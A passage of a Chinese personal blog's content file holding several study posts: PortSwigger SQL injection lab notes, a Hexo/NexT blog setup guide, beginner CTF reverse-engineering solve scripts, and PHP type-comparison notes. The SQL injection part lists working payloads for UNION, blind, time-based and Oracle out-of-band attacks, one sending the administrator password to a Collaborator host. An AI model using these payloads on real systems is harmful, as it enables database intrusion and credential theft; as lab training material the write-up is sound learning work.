+
+这里测试出来时两列，然后测试了好多查询版本的，发现时是PostgreSQL
+那么就正常来查询表名-&gt;列名-&gt;数据
+查表
+?category=Gifts%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--+
+
+查列名
+?category=Gifts%27+UNION+SELECT+column_name%2CNULL+FROM+information_schema.columns+WHERE+table_name%3D%27users%27--+
+
+查数据
+?category=Gifts%27+UNION+SELECT+username%2Cpassword+FROM+users--+
+
+Lab10: SQL injection UNION attack, retrieving multiple values in a single column依旧还是两列
+测试之后发现第二列可以显示出来，第一列不行
+那么还是老流程查表名-&gt;查列名-&gt;查数据
+查表名
+?category=Gifts%27%20union%20select%20%271%27,NULL%20from%20information_schema.tables--+
+
+查列名
+?category=Gifts%27%20union%20select%20NULL,column_name%20from%20information_schema.columns%20where%20table_name=%27users%27--+
+
+查数据，因为这里第一列不能正常显示数据，所以要把账号密码都显示在第二列
+?category=Gifts%27+UNION+SELECT+NULL,username||%27~%27||password+FROM+users--
+
+username || &#39;~&#39; || password 这种写法，这是 SQL 的字符串拼接。
+|| 表示把左右两边的文本连接起来：
+username || &#x27;~&#x27; || password
+
+假设：
+username = alicepassword = abc123
+
+拼接过程就是：
+alice + ~ + abc123 → alice~abc123
+
+&#39;~&#39; 是一个普通字符串，作为分隔符使用，也可以换成 &#39;:&#39;：
+username || &#x27;:&#x27; || password-- 结果：alice:abc123
+
+Lab11: Blind SQL injection with conditional responses这里的内容在之前是没有学习到了，现在给自己补充一下
+当处理包含TrackingId cookie的请求时，应用程序使用SQL查询来确定这是否是已知用户，因此可能也会存在sql注入
+布尔盲注常用的不是“特殊注入函数”，而是把数据库中的信息转换成真假条件。常见函数有这些：
+
+
+
+目的
+PostgreSQL &#x2F; Oracle &#x2F; SQLite
+MySQL
+
+
+
+截取字符
+SUBSTRING(password,1,1)
+SUBSTRING(password,1,1)
+
+
+获取长度
+LENGTH(password)
+LENGTH(password)
+
+
+获取字符编码
+ASCII(SUBSTRING(password,1,1))
+ASCII(SUBSTRING(password,1,1))
+
+
+判断是否存在
+EXISTS(SELECT 1 FROM users ...)
+同样支持
+
+
+条件分支
+CASE WHEN 条件 THEN ... ELSE ... END
+同样支持
+
+
+字符拼接
+&#96;username
+
+
+
+其中最常用的函数:
+SUBSTRING() #取字符LENGTH()  #测长度ASCII()  #猜具体字符
+
+学习完这些函数直接来这道具体的题目实践一下
+先抓个包
+测试一下TrackingId ,&#39; and 1=1-- 出现了welcome back！
+
+换成了&#39; and 1=2-- ，welcome back就消失了
+
+有布尔盲注，那么现在来找一下我们需要的密码的长度
+&#39; and (select LENGTH(password) from users where username= &#39;administrator&#39;)&gt;19 --
+测到大于20发现welcome back就消失了，那么这个密码的长度肯定是20位
+
+那么现在来猜密码都是什么字符，从第一个猜到第二十个，肯定要爆破了，然后这里用截取字符串的函数
+SUBSTRING(string, start, length)：截取字符串
+那么就是爆破start索引和函数截取出来的字符
+只有and的条件都为真的时候才会有welcome back
+
+
+payload1选1-20的数字
+
+payload2选择26个字母和0-9的数字
+
+然后匹配在settings里面选择匹配一下welcome back
+
+爆破完筛选一下welcome back！
+
+Lab12: Blind SQL injection with conditional errors这道题目是条件错误的SQL盲注，而且还是Oracle数据库
+先构造一个查询
+&#39;||(select &#39;&#39; from dual)||&#39;
+发现是正常的
+然后再构造一个肯定不正常的查询
+&#39;||(select &#39;&#39; from dual)||&#39; 出现报错。这个时候就可以确认，sql语句肯定被带入查询了
+然后查询是否存在users表
+&#39; ||(select &#39;&#39; from users where rownum=1)||&#39;--,页面返回是正常的
+
+SELECT     CASE         WHEN (your-condition-here)         THEN TO_CHAR(1/0)  -- 条件成立时执行，执行数据库报错        ELSE NULL          -- 条件不成立时返回NULL    END FROM DUAL;
+
+构造一个查询的语句，让条件永真，然后我们去查一些我们想要知道的东西，如果我们查到了，就一定会报错
+那么来查询一下到底存不存在这个管理员用户
+&#39;||(select case when (1=1) then to_char(1/0) else &#39;&#39; end from users where username=&#39;administrator&#39;)||&#39;
+报错了，那么肯定是存在的
+
+然后判断他的密码的长度
+&#39;||(select case when length(password)&gt;1 then to_char(1/0) else &#39;&#39; end from users where username=&#39;administrator&#39;)||&#39;
+一致报错，知道密码的长度大于20的时候，不报错了，那么就判断密码长度是20
+
+那么下一步就肯定是要爆破密码了，和上一题一样，只不过换了个数据库，用的函数不一样
+&#39;||(select case when substr(password,1,1)=&#39;a&#39; then to_char(1/0) else &#39;&#39; end from users where username=&#39;administrator&#39;)||&#39;
+这里用的是substr(),用法一致
+
+
+Lab13: Visible error-based SQL injection先正常测试一下，看到了报错，引号没闭合
+
+加上注释之后正常了
+
+&#39; order by 2 都报错，那肯定是只返回一行
+
+试一下直接union查询,&#39; union select 1--类型不匹配,不是int类型的
+
+经过判断发现是布尔类型的？好奇怪
+
+&#39; and 1=CAST((select username from users) as int) --后面构造一个布尔类型的，加一个字查询
+查出来的字段，如果不能转化为int类型，那么就报错，报错的同时也会显示那些部分不能被转化为int型
+也就把账号或者密码带出来了,但是出现了一个报错，仔细看一下发现我们的代码不全，猜测是不是被限制了长度，那么直接把Trackingid删了，保留引号即可
+
+这里出了问题是返回的数据超过了一行
+
+限制一下 &#39; and 1=CAST((select username from users limit 1) as int) --
+
+查询一下密码看看&#39; and 1=CAST((select password from users limit 1) as int) --
+
+个人感觉有报错比盲注简单
+Lab14: Blind SQL injection with time delays实验要求很简单，实现一下时间盲注就行，抓包添加函数，然后发包&#39;||pg_sleep(10) 
+
+Lab15: Blind SQL injection with time delays and information retrieval这里就只写payload吧，实在是有点累
+&#x27;||ph_sleep(10)-- #确实是延迟了十秒才返回，确定有sql注入# 下面来确定一下数据库中是否有users表，其实和哪个反推的那个题很像，只不过加入了sleep&#x27;||(select case when(1=2) then pg_sleep(10) else pg_sleep(-1) end)--# 这个还是一样的查到管理员了就延迟十秒，如果确是延迟了确定是有管理员&#x27;||(select case when(username=&#x27;administrator&#x27;) then pg_sleep(10) else pg_sleep(-1) end from users)# 查密码的长度,依旧查到20&#x27;||(select case when(username=&#x27;administrator&#x27; and LENGTH(password)&gt;1) then pg_sleep(10) else pg_sleep(-1) end from users)# 爆破密码，和之前的题是一样的&#x27;||(select case when(username=&#x27;administrator&#x27; and substring(password,1,1)=&#x27;a&#x27;) then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+Lab16: Blind SQL injection with out-of-band interaction先去burp的collaborator中生成一个域名，然后按照提示里给的payload组合一下
+&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//93atq26cmnkcbfq8xmuotiyd248vwlka.oastify.com/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual--;
+
+Lab17: Blind SQL injection with out-of-band data exfiltrationpayload
+TrackingId=x&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.1lnl8uo44f24t780fecgbag5kwqoee23.oastify.com/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual--
+
+和上一题一样
+
+TrackingId 注入 SQL→ SQL 查询 administrator 的 password→ 把 password 拼进 XML 外部实体的 URL→ Oracle 解析 XML 时访问这个 URL→ Collaborator 收到 DNS 请求→ DNS 子域名前缀就是密码
+
+关键 SQL 结构是：
+SELECT EXTRACTVALUE(  XMLTYPE(&#x27;...外部实体 URL...&#x27;),  &#x27;/l&#x27;)FROM dual
+
+XML 中的外部实体类似：
+&lt;!DOCTYPE root [  &lt;!ENTITY % remote SYSTEM &quot;http://密码.你的Collaborator域名/&quot;&gt;  %remote;]&gt;
+
+其中：
+&#x27;||(SELECT password     FROM users     WHERE username=&#x27;administrator&#x27;)||&#x27;
+
+会被 Oracle 计算成真实密码，并拼到 URL 中。例如最终访问：
+http://py0w5gsvg10g2sx45v59.你的域名/
+
+所以 Collaborator 收到的完整 DNS 名称中：
+py0w5gsvg10g2sx45v59
+
+Lab18: SQL injection with filter bypass via XML encoding这个要用到一个拓展Hackvertor来绕过检测
+在商品的查看库存地方会POST一个xml格式的id，抓他的包
+
+因为他是xml格式的，所以就不需要拼接单引号，直接union
+union select null
+
+被检测了，用拓展的插件进行16进制实体编码
+
+
+直接把语句换一下，拼接账号密码
+
+
+总结SQL注入完结撒花，学到了很多新的东西，感觉很新鲜，有什么补充的会重新更新一下的
+]]></content>
+      <categories>
+        <category>web安全学习</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>SQL注入</tag>
+        <tag>PortSwigger</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在Mac上搭建个人博客：Hexo + NexT + 自定义域名搭建永久有效的个人博客网站</title>
+    <url>/2026/10/16/mac-hexo-next-custom-domain-blog/</url>
+    <content><![CDATA[本文记录在 Mac 上搭建和维护 Hexo + NexT 博客的过程，涵盖 GitHub Pages、自定义域名与 DNS，并补充 HanLior 网站当前的项目目录、主题、文章阅读和页脚统计配置。
+
+
+配置Github项目在Github右上角点击Repository
+然后去New一个
+
+按照下面的输入配置，名字输入自己想要起的名字就可以
+
+生成密钥ssh-keygen -t rsa -b 4096然后一路回车，可以看到生成到了/Users/cr1sp/.ssh/id_rsa  这里Cr1sp是我电脑的用户名用编辑器打开，去复制id_rsa.pub到github：https://github.com/settings/ssh改变密钥认证方式：ssh-keyscan -t ed25519 github.com &gt;&gt; ~/.ssh/known_hosts测试是否成功：ssh -T git@github.com
+
+如果出现这样的字就是代表可以链接成功
+
+设置账号信息：
+git config --global user.name &quot;HanLior&quot;
+
+设置github邮箱：
+git config --global user.email &quot;你的 GitHub 邮箱&quot;
+
+下载Git这里我用的homebrew下载的git
+1.先安装homebrew/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;
+
+2.通过Homebrew安装Gitbrew install git
+
+3.验证是否安装成功
+出现这样的就是安装成功
+安装node.js1.下载node.jsbrew install node
+
+2.验证是否下载成功node --version
+
+
+搭建Hexo1.切换阿里云镜像源npm config set registry https://registry.npmmirror.com
+
+2.安装cnpmnpm install -g cnpm --registry=https://registry.npmmirror.com
+
+3.用 cnpm 安装 hexocnpm install -g hexo-cli
+
+4.验证是否安装成功
+本地创建Hexo博客文件先在本地目录里面创建一个文件夹
+mkdir blogcd bloghexo init
+
+然后看到blog目录文件里面有这些东西就可以
+
+node_modules: 依赖包public：存放生成的页面scaffolds：生成文章的一些模板source：用来存放你的文章themes：放下下载的主题_config.yml: 博客的核心配置文件（设置主体、标题等属性）
+
+启动cnpm install
+
+启动hexo hexo s -g
+
+访问127.0.0.1:4000
+
+配置域名解析，可以参考这篇文章
+https://www.duheweb.com/post/20210417143744.html
+然后去github配置一下域名，启用https
+
+本站实际配置记录以下配置对应本博客当前使用的 GitHub 仓库和域名：
+
+GitHub 用户：HanLior
+Pages 仓库：HanLior/HanLior.github.io
+域名：www.hanlior.top
+Hexo 项目目录：/Users/cr1sp/blog
+Hexo：8.1.2；NexT：8.21.1，Pisces 风格
+
+目录和发布链路博客源文件放在 /Users/cr1sp/blog。source/_posts 保存文章，source/categories、source/tags 和 source/about 保存导航页面；NexT 配置放在 _config.next.yml。文章图片托管在单独的图床仓库 xhcola/typora_drawing_bed，正文使用 raw.githubusercontent.com 图片链接，不把图片文件混进 Hexo 文章目录。
+发布时，Hexo 先把源文件生成到 public，再由 hexo-deployer-git 把生成结果推送到 Pages 仓库 HanLior/HanLior.github.io 的 main 分支。这个 Pages 仓库用于托管生成后的网站。
+配置 DNS在域名服务商的 DNS 解析页面添加以下记录。根域名用 4 条 A 记录，www 用 CNAME；CNAME 的记录值不要带 https:// 或末尾路径。
+
+
+
+主机记录
+类型
+记录值
+
+
+
+@
+A
+185.199.108.153
+
+
+@
+A
+185.199.109.153
+
+
+@
+A
+185.199.110.153
+
+
+@
+A
+185.199.111.153
+
+
+www
+CNAME
+HanLior.github.io
+
+
+在 GitHub 仓库 HanLior/HanLior.github.io 的 Settings → Pages 中，发布来源选择 Deploy from a branch，分支选择 main、目录选择 /(root)。Custom domain 填 www.hanlior.top。等 DNS 检查和 TLS 证书签发完成后，再启用 Enforce HTTPS。
+在 Hexo 的 source/CNAME 文件中只写自定义域名：
+www.hanlior.top
+
+不要把 CNAME 文件放在 source/_posts 里，也不要把它命名为 CNAME.txt。
+配置 Hexo 部署到 GitHub Pages在博客根目录 /Users/cr1sp/blog 安装部署插件：
+npm install hexo-deployer-git --save
+
+在根目录的 _config.yml 配置仓库和分支：
+deploy:  type: git  repo: git@github.com:HanLior/HanLior.github.io.git  branch: main
+
+每次发布前先清理并重新生成，再部署：
+npx hexo cleannpx hexo generatenpx hexo deploy
+
+也可以依次使用 hexo clean、hexo generate、hexo deploy。第一次在本机部署时需要已经配置 GitHub SSH Key，并确认 ssh -T git@github.com 可以连接。
+安装并启用 NexT 主题本站使用 NexT 8.21.1，主题通过 npm 安装并由 package.json 管理：
+npm install hexo-theme-next@8.21.1 --save
+
+Hexo 根目录 _config.yml 中设置：
+theme: next
+
+主题设置写在博客根目录的 _config.next.yml，不是 themes/next/_config.yml。本站使用 Pisces、深色模式、左侧文章侧栏、中文导航和 GitHub 个人链接：
+scheme: Piscesdarkmode: truesidebar:  position: left  display: postmenu:  home: / || home  categories: /categories/ || th  tags: /tags/ || tags  about: /about/ || usersocial:  GitHub: https://github.com/HanLior || fab fa-github
+
+menu 中的页面需在 source 目录下创建对应页面。本站导航显示首页、分类、标签和关于；归档页面仍可通过 /archives/ 访问，但没有放进主导航。
+archives: /archives/ || archive
+
+创建分类、标签和关于页面可用 Hexo 命令生成页面：
+npx hexo new page categoriesnpx hexo new page tagsnpx hexo new page about
+
+命令会创建 source/&lt;页面名&gt;/index.md。分类页和标签页的 front matter 分别设置 type: categories、type: tags；这些页面以及关于页均可设置 comments: false。例如：
+---title: 分类type: categoriescomments: false---
+
+文章通过 front matter 设置分类和标签。本站的分类包括“博客搭建”“逆向学习”和“web安全学习”。Hexo 默认会隐藏没有文章的分类；persistent_categories 配置和 scripts/persistent-categories.js 会让预设分类在文章发布前也能显示。文章归入该分类后，分类页会自动列出文章。
+首页摘要、分页和文章信息本站首页每页显示 10 篇文章。文章使用 &lt;!-- more --&gt; 分隔摘要和正文：首页只显示分隔符之前的内容，读者点击“阅读全文”进入全文。新文章可按下面的结构设置分类、标签和摘要：
+---title: 文章标题date: 2026-11-02 16:00:00categories:  - web安全学习tags:  - PHP---这里写首页摘要。&lt;!-- more --&gt;这里开始是文章全文。
+
+字数和预计阅读时间由 hexo-word-counter 生成，只有文章级统计开启，不显示全站总字数或总阅读时间：
+npm install hexo-word-counter --save
+
+Hexo 根目录 _config.yml：
+symbols_count_time:  symbols: true  time: true  total_symbols: false  total_time: false
+
+主题配置 _config.next.yml 控制发表于日期、分类和字数&#x2F;阅读时间布局。source/_data/post-meta.njk 额外显示文章文件的实际修改日期和时间：
+post_meta:  item_text: true  created_at: true  updated_at:    enable: false    another_day: true  categories: truesymbols_count_time:  separated_meta: true  item_text_total: falsecustom_file_path:  postMeta: source/_data/post-meta.njk
+
+项目的 updated_option 设为 mtime，因此文章更新信息根据源文件修改时间生成。自定义元信息模板会把更新日期和时分秒显示在文章标题下方。
+本站开启的搜索和 SEO 基础功能安装搜索索引、Atom 订阅和站点地图插件：
+npm install hexo-generator-searchdb hexo-generator-feed hexo-generator-sitemap --save
+
+Hexo 根目录 _config.yml 中配置搜索索引、订阅和站点地图：
+search:  path: search.xml  field: post  content: true  format: striptagsfeed:  type: atom  path: atom.xml  limit: 20sitemap:  path: sitemap.xml  tags: true  categories: true
+
+NexT 的 _config.next.yml 开启本地搜索：
+local_search:  enable: true  top_n_per_article: 1  unescape: false  preload: false
+
+本站在 _config.next.yml 中开启了 Mac 风格的代码块复制按钮：
+codeblock:  copy_button:    enable: true    style: mac
+
+页脚的访客数和浏览量写在 source/_data/footer.njk，通过兼容不蒜子接口的脚本 https://busuanzi.meuicat.com/js 显示。NexT 内置的不蒜子开关保持关闭，因为原接口曾返回 502。切换到新服务后，访客数和浏览量从新服务开始累计。相同页脚还显示博客运行时间，起点为首次部署记录的北京时间 2026-10-16 18:48:16。
+根目录配置还要填写站点标题、作者、语言、时区和正式网址。本站当前值如下：
+title: HanLiorsubtitle: 技术学习与实践description: HanLior 的个人博客，记录技术学习、项目实践与思考。keywords: Hexo, NexT, HanLiorauthor: HanLiorlanguage: zh-CNtimezone: Asia/Shanghaiurl: https://www.hanlior.top
+
+搜索引擎抓取规则放在 source/robots.txt：
+User-agent: *Allow: /Sitemap: https://www.hanlior.top/sitemap.xml
+
+本站开启了 NexT 深色模式、左侧侧栏、本地搜索和代码复制。网站根目录 _config.yml 还设置每页 10 篇、Atom 订阅、站点地图和 robots.txt。访问统计会在访客打开网页后逐步累计。
+删除默认示例文章Hexo 初始化时会生成 source/_posts/hello-world.md。删除该文件并重新部署后，文章和归档列表里就不会再显示 Hello World。source/index.md 是没有文章时的首页提示；有文章时，首页由文章索引生成器列出文章摘要：
+---title: 首页layout: pagecomments: false---文章正在整理中，欢迎稍后再来。
+
+之后写新文章可运行：
+npx hexo new post &quot;文章标题&quot;
+
+完成编辑后再运行清理、生成和部署命令。
+]]></content>
+      <categories>
+        <category>博客搭建</category>
+      </categories>
+      <tags>
+        <tag>Mac</tag>
+        <tag>Hexo</tag>
+        <tag>NexT</tag>
+        <tag>GitHub Pages</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础逆向分析学习</title>
+    <url>/2026/10/16/reverse-engineering-basics/</url>
+    <content><![CDATA[本文整理 Android 注册逻辑、Java 解密、ELF 与 Windows 程序等基础逆向分析题目的思路和脚本。
+
+
+基本函数char *strcat(char *dest, const char *src) 把 src 所指向的字符串追加到 dest 所指向的字符串的结尾。
+简单注册器刚接触到安卓逆向，用jdx打开apk包发现注册逻辑
+
+编写exp：
+x = list(&#x27;dd2940c04462b4dd7c450528835cca15&#x27;)x[2] = chr(ord(x[2]) + ord(x[3]) - 50)x[4] = chr(ord(x[2]) + ord(x[5]) - 48)x[30] = chr(ord(x[31]) + ord(x[9]) - 48)x[14] = chr(ord(x[27]) + ord(x[28]) - 97)for i in range(0,16):    a = x[31 - i ]    x[31 - i] = x[i]    x[i] = a print(&quot;flag&#123;&quot; + &quot;&quot;.join(x) + &quot;&#125;&quot;)
+
+获得flag为flag{59acc538825054c7de4b26440c0999dd}
+JAVA逆向解密
+看  Encrypt（）的逻辑，flag作为参数传入
+for (char c : arr) &#123;            int result = (c + &#x27;@&#x27;) ^ 32;            Resultlist.add(Integer.valueOf(result));        &#125;
+
+这是加密的主要逻辑
+逆向一下加密逻辑就是
+c &#x3D; result ^ 32 - ord(‘@’)
+后面使用KEY来做对比
+所以编写脚本
+KEY = [180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65]result = &quot;&quot;for value in KEY:    value = value ^ 32    value = value - 64    cha = chr(value)    result = result + chaprint(&quot;flag&#123;&quot;+result+&quot;&#125;&quot;)
+
+flag{This_is_the_flag_!}
+luck_guy解压之后先查壳，发现无壳，是ELF64位文件
+
+将luck_guy拖进IDA中分析
+
+发现是switch-case函数，逐个分析一下每一个case
+case1的作用是先将s设置为空，将f1和f2都链接在s之后，那么s可能就是要找的flag，点击了一下f1，发现了f1的值
+
+case2和case3 都是输出，先不管
+case4这里给了 s &#x3D; ‘\x7Ffoguci&#39; ,刚开始查文件时候说了是ELF64文件，所以它存储的时候是小端存储，但是在IDA的显示中会变为大端存储，所以需要把s逆置一下，也就是s = icugof,然后会把s插入f2之后
+Case5是对f2进行处理，这个循环的含义是如果j为奇数，就把f2 - 2，如果是偶数，就把f2 - 1
+所以可以猜想一下，case4 -&gt; case5 -&gt; case1 就可以得到flag
+编写脚本走一圈
+f1 =list(&#x27;GXY&#123;do_not_&#x27;)f2 =list(&#x27;icug`of&#x27;)for i in range(0,7):    if i % 2 == 0:        f2[i] = chr(ord(f2[i]) - 1)    else:        f2[i] = chr(ord(f2[i]) - 2)print(&quot;&quot;.join(f1)+&quot;&quot;.join(f2)+&quot;&#125;&quot;)
+
+得到flag
+GXY{do_not_hate_me}
+刮开有奖先查壳，没什么有效信息
+
+直接丢IDA，看到DIalogFunc直接跟进去
+
+这里大概就能看到加密的主体了，将这些东西都修复了就变成这样了
+
+第一点，输入字符的长度必须是8
+第二点，下面的这些变量肯定是和flag有关
+跟进sub_4010f0函数
+
+发现函数是升序的快速排序，给函数更一下名
+那么意思就是将上面的变量进行升序排序
+key = list(&quot;ZJSECaNH3ng&quot;)key.sort()print(&quot;&quot;.join(key))# 3CEHJNSZagn
+
+
+
+再往下看sub_401000函数，跟进去
+
+观察函数逻辑，发现是base64加密，跟进去byte_407830中，看一下base64表是没有变的
+在主函数的逻辑中，v4 v5都是被base64加密之后的变量
+最后看if的判断条件
+
+排序后的元素为3CEHJNSZagn
+1️⃣v7[0]表示的是第一个元素 也就是3 ，string[0] &#x3D; v7[0] + 34
+2️⃣v10代表的是第五个元素 对应的也就是J 
+3️⃣逆运算一下 string[2] &#x3D; (3 * v8 + 141) &#x2F; 4,这里的v8是第三个元素，也就是E
+4️⃣逆运算一下 string[3] &#x3D; 2 * (v13 &#x2F; 9) * 4,这里的v13是第八个元素 ，也就是Z
+5️⃣6️⃣都是做比较，将ak1w和V1Ax base64解密一下再做比较，因为上面说过了 v4 v5都是base64加密之后的变量，解密之后为ak1w -&gt; jMp V1Ax -&gt; WP1
+从上往下求一下
+key = &quot;3CEHJNSZagn&quot;string0 = chr(ord(key[0]) + 34)string1 = key[4]string2 = chr(int((3 * ord(key[2]) + 141) / 4))string3 = chr(int(ord(key[7]) / 9 * 2 * 4))print(string0 + string1 + string2 + string3)
+
+得到UJWP，因为已知长度是8，上面两个字符串base64解密后为jMp和 WP1,做一下比较可以得到WP1在前面
+所以flag为flag{UJWP1jMp}
+[BJDCTF2020]JustRE进去之后查看字符串，发现一个和flag很像的东西，跟进去
+
+ 
+发现点击次数为19999输出flag，再往下看format，把19999和0带入进去得到flag
+flag{1999902069a45792d233ac}
+romemiwen = [&#x27;p&#x27;, &#x27;v&#x27;, &#x27;k&#x27;, &#x27;q&#x27;, &#x27;&#123;&#x27;, &#x27;m&#x27;, &#x27;1&#x27;, &#x27;6&#x27;, &#x27;4&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;2&#x27;, &#x27;6&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;l&#x27;, &#x27;4&#x27;, &#x27;m&#x27;, &#x27;4&#x27;, &#x27;9&#x27;, &#x27;l&#x27;, &#x27;n&#x27;, &#x27;p&#x27;, &#x27;7&#x27;, &#x27;p&#x27;, &#x27;9&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;2&#x27;, &#x27;8&#x27;, &#x27;k&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;&#125;&#x27;]mingwen = [&#x27;&#x27;] * 38for i in range(0,38):    if (miwen[i] &gt;= &#x27;A&#x27; and miwen[i] &lt;= &#x27;Z&#x27;) or (miwen[i] &gt;= &#x27;a&#x27; and miwen[i] &lt;= &#x27;z&#x27;):        y = ord(miwen[i]) + 16        if (y &gt; ord(&#x27;Z&#x27;) and y &lt; ord(&#x27;a&#x27;)) or (y &gt;= ord(&#x27;z&#x27;)):            y -= 26        mingwen[i] = chr(y)    else:        mingwen[i] = miwen[i]print(&quot;&quot;.join(mingwen))print(mingwen)
+
+[GWCTF 2019]pyre拿到题目反编译后得到这样的python代码
+
+分析第二个循环一下能够知道，反着算就行，code的最后一位是不变的
+由于最后一位code[i + 1]没变，从后往前走，code[i + 1] ^ code [i]得到的就是异或前的code[i]
+从后往前异或完得到的就是num
+然后分析第一个循环
+num &#x3D; (input[i] + i) % 128
+反着算就是flag
+num &#x3D; (input[i] - i) % 128
+编写exp
+code = [&#x27;\x1f&#x27;,&#x27;\x12&#x27;,&#x27;\x1d&#x27;,&#x27;(&#x27;,&#x27;0&#x27;,&#x27;4&#x27;,&#x27;\x01&#x27;,&#x27;\x06&#x27;,&#x27;\x14&#x27;,&#x27;4&#x27;,&#x27;,&#x27;,&#x27;\x1b&#x27;,&#x27;U&#x27;,&#x27;?&#x27;,&#x27;o&#x27;,&#x27;6&#x27;,&#x27;*&#x27;,&#x27;:&#x27;,&#x27;\x01&#x27;,&#x27;D&#x27;,&#x27;;&#x27;,&#x27;%&#x27;,&#x27;\x13&#x27;]len = len(code)flag = &#x27;&#x27;for i in range(len - 2, -1, -1):    code[i] = chr(ord(code[i]) ^ ord(code[i + 1]))for i in range(len):    flag += chr((ord(code[i]) - i )% 128)print(flag)
+]]></content>
+      <categories>
+        <category>逆向学习</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>PHP学习笔记：类型比较、超全局变量与面向对象</title>
+    <url>/2026/10/28/php-learning/</url>
+    <content><![CDATA[本文记录 PHP 基础语法、弱类型比较、超全局变量与常见函数，并通过类、对象、构造方法和继承入门面向对象。
+
+
+学习地址
+基础语法PHP 脚本在服务器上执行，然后将纯 HTML 结果发送回浏览器
+PHP代码的基本格式
+&lt;?php//PHP代码?&gt;
+
+PHP变量
+变量以 $ 符号开始，后面跟着变量的名称
+
+变量名必须以字母或者下划线字符开始
+
+变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）
+
+变量名不能包含空格
+
+变量名是区分大小写的（$y 和 $Y 是两个不同的变量）
+这些和其他语言的差别不大
+
+
+&lt;?php$x=5;  //给x赋值$y=6;  // $给变量赋值 $z=$x+$y;echo $z;?&gt;
+
+PHP 是一门弱类型语言
+这是什么意思那，就是不必向 PHP 声明该变量的数据类型，和C语言对比，比如c语言定义一个整型变量需要int a; 但是在PHP中就不需要，PHP 会根据变量的值，自动把变量转换为正确的数据类型。
+PHP数据类型和比较
+String（字符串）
+
+Integer（整型）
+
+Float（浮点型）
+
+Boolean（布尔型）
+
+Array（数组）
+
+Object（对象）
+
+NULL（空值）
+
+Resource（资源类型）
+数组这里array() 和其他语言不太一样，重点学习一下
+
+
+&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);var_dump($cars);?&gt;
+
+
+面向对象的部分放在后面写
+类型比较
+注意事项说在前面
+这里我踩了一些坑，刚一开始我用的系统安装的php来跑，发现怎么都得不到想要的flag，后来查询资料得到了原来是因为我安装的php8，版本比较高了，这些都不存在了
+这段代码的关键区别在 $num == 1：PHP 7 会把 &quot;1abc&quot; 转成数字 1；PHP 8 不再这样处理，所以同样的输入在 PHP 7 能得到 flag，在 PHP 8 不能
+所以环境一定要选择对，可以用phpstudy的环境来跑
+
+松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型
+
+严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型
+&lt;?phpif(42 == &quot;42&quot;) &#123;    echo &#x27;1、值相等&#x27;;&#125; echo PHP_EOL; // 换行符 if(42 === &quot;42&quot;) &#123;    echo &#x27;2、类型相等&#x27;;&#125; else &#123;    echo &#x27;3、类型不相等&#x27;;&#125;?&gt;
+
+
+这里让gpt写了一段php代码来学习一下弱类型比较
+&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;PHP 条件判断练习&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form method=&quot;get&quot;&gt;        &lt;label&gt;            输入 num：            &lt;input type=&quot;text&quot; name=&quot;num&quot;&gt;        &lt;/label&gt;        &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;    &lt;/form&gt;    &lt;pre&gt;&lt;?php    if (isset($_GET[&#x27;num&#x27;]) &amp;&amp; is_string($_GET[&#x27;num&#x27;])) &#123;        $num = $_GET[&#x27;num&#x27;];        if (!is_numeric($num)) &#123;            // 将输入作为普通文字显示            echo htmlspecialchars($num, ENT_QUOTES, &#x27;UTF-8&#x27;);            if ($num == 1) &#123;                echo &quot;\nflag&#123;**********&#125;&quot;;            &#125;        &#125;    &#125;    ?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
+
+如果输入的是单纯一个数字，什么都不会显示
+
+但是如果输入1abc的话，就会直接出flag
+
+这里的原理就是源代码中
+if ($num == 1) &#123;               echo &quot;\nflag&#123;**********&#125;&quot;;           &#125;
+
+判断一下输入的数字是否和1相等，如果我理解没错的话，要比较的1是一位数组，然后我们输入的是1abc 自动的也就是和第一位的1比较了，然后因为弱类型比较，得到的是true，所以就输出了flag
+超级全局变量PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。
+PHP 超级全局变量列表:
+
+$GLOBALS
+
+$_SERVER
+
+$_REQUEST
+
+$_POST
+
+$_GET
+
+$_FILES
+
+$_ENV
+
+$_COOKIE
+
+$_SESSION
+也就是在这些输入点，可能会导致很多的漏洞点，这里借用一下学长总结的表格
+
+
+
+变量
+用途
+渗透关注点
+
+
+
+$_GET
+URL 参数
+最常见注入入口
+
+
+$_POST
+POST Body
+表单注入入口
+
+
